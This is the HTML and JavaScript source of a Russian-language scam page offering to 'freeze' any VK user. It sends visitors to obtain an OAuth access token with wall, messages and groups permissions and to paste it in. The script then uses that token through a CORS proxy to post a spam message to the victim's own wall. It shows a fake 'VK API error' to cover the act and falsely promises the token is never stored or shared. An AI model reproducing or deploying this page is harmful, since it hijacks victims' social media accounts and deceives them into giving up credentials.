<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<title>Заморозить страницу VK</title>
	<link rel="shortcut icon" href="https://vk.com/images/favicon_vk_2x.ico">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">

	<meta name="description" content="Заморозить любого пользователя VK">
	<meta name=keywords content="вк, бан вк, вк бан, бан, блокировка, заморозка, заморозить, забанить, взломать, взлом страницы, vk, vkontakte, вконтакте">
</head>
<body>
	<div class="container text-center mt-5 align-middle">
		<div class="row justify-content-center">
			<div style="padding: 5%;">
				<img src="https://vk.com/images/icons/pwa/apple/default.png?8" style="border-radius: 90px;" width="50" height="50">
				<h1>Заморозка пользователя</h1>
				<p>С недавних пор в VK появилась уязвимость: стало возможным благодаря некоторым инструментам замораживать страницу буквально любого пользователя.</p>
				<p><a href="https://oauth.vk.com/authorize?client_id=2685278&scope=wall,messages,groups&redirect_uri=https://oauth.vk.com/blank.html&display=page&response_type=token&revoke=1" target="_blank">Получить токен</a></p>
				<div id="error"></div>
				<p><input class="form-control" placeholder="Токен" id="token"></p>
				<p><input class="form-control" placeholder="Ссылка на пользователя"></p>
				<p><button class="btn btn-primary mr-1" id="action">Заморозить</button></p>
				<p><b>Ваш токен нигде не хранится и никому не передаётся.</b></p>
				<iframe width="560" height="315" src="https://www.youtube.com/embed/ilfIzgAOaN8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
				<p>Видеоинструкция по использованию</p>
			</div>
		</div>
	</div>

	<script>
		let button = document.getElementById('action');
		button.onclick = function() {
			let token = document.getElementById('token').value;

			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/wall.post?v=5.103&access_token=${token}&message=vto.pe`).then(response => console.log(response.json()));

			setTimeout(function(){
				let el = document.createElement('div');
				el.className = 'alert alert-danger';
				// el.className = 'alert alert-success';
				el.innerHTML = 'Ошибка VK API. Попробуйте позже.';
				// el.innerHTML = 'Блокировка успешна!';
				document.getElementById('error').append(el);
			}, 750);
		}

		function callback(response) {}
		
	</script>
	
</body>
</html>
